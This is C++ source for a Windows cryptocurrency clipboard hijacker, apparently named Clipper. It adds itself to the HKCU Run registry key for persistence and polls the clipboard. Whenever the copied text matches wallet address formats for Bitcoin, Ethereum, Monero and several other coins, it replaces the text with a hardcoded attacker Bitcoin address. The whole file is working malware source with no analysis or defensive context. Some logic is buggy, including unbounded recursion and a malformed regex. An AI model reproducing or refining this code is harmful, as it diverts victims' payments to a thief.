#include <string>
#include <atlstr.h>
#include <winuser.h>
#include <regex>

#pragma comment(lib, "user32.lib")
#pragma warning(disable:4326)

using namespace std;

void Writebuffer(string&);
string Readbuffer();
void checkers(string& data);
void Reactor();
void autoranner();


string crypto = "15DQ4VCLvidYRsPjVKwxgntFrta16Kgikv";


void main()
{
#pragma comment(linker, "/SYBSYSTEM:windows, /ENTRY:mainCRTStartup " )
	HANDLE hijeck = CreateMutex(NULL, false, L"My_programm_Already_Present");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		MessageBoxW(NULL, L"The program is already running", L"Error", MB_SYSTEMMODAL | MB_ICONERROR);
		CloseHandle(hijeck);
	}
	autoranner();
	Reactor();
	
}

void checkers(string& data)
{
	bool flag = false;
	cmatch res;
	regex btc("(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)");
	regex eth1("(?:^0x[a - fA - F0 - 9]{40}$)");
	regex xmr("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)");
	regex xlm("(?:^G[0-9a-zA-Z]{55}$)");
	regex xrp("(?:^r[0-9a-zA-Z]{24,34}$)");
	regex ltc("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)");
	regex nec("(?:^A[0-9a-zA-Z]{33}$)");
	regex bch("^((bitcoincash:)?(q|p)[a-z0-9]{41})");
	regex dash("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)");
	regex arr[9]{ btc, eth1, xmr, xlm, xrp, ltc, nec, bch, dash };
	if (flag == false)
	{
		for (int i = 0; i <= 8; i++)
		{
			bool g = regex_match(data.c_str(), res, arr[i]);
			if (g)
			{
				Writebuffer(crypto);
				flag = true;

			}
		}
	}
	else

	{
		Reactor();
	}

}

void autoranner()
{
	_TCHAR pathname[256] = _T("C:\\Users\\murza\\source\\repos\\Clipper\\x64\\Debug\\Clipper.exe");
	HKEY hg;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hg);
	RegSetValueEx(hg, L"Clipper.exe", NULL, REG_SZ, (BYTE*)pathname, sizeof(pathname));
	RegCloseKey(hg);
}

void Reactor()
{
	string data1="";
	string data2 = Readbuffer();
	if (data2 != data1)
	{
		if (IsClipboardFormatAvailable(CF_TEXT))
		{
			if (OpenClipboard(NULL))
			{

				Readbuffer();
				data1 = Readbuffer();
				CloseClipboard();
				
				


			}
			Sleep(2000);
		}
		Reactor();
		
	}
	else
	{
		data2 = "";
		data1 = "";
		Reactor();
	}
	
	
	
	
}

string Readbuffer()
{
	if (OpenClipboard(NULL))
	{
		string data;
		HANDLE buffdata;
		char* chBuffer;
		buffdata = GetClipboardData(CF_TEXT);
		chBuffer = (char*)GlobalLock(buffdata);
		data = chBuffer;
		GlobalUnlock(buffdata);
		checkers(data);
		CloseClipboard();
		return data;

	}
}

void Writebuffer(string& crypto)
{
	if (OpenClipboard(NULL))
	{
		HGLOBAL buffer;
		char* chBuffer;
		EmptyClipboard();
		buffer = GlobalAlloc(GMEM_DDESHARE, crypto.size() + 1);
		chBuffer = (char*)GlobalLock(buffer);
		memcpy(GlobalLock(buffer), crypto.c_str(), crypto.size() + 1);
		GlobalUnlock(buffer);
		SetClipboardData(CF_TEXT, buffer);
		CloseClipboard();
		Sleep(2000);
		Reactor();
	}
}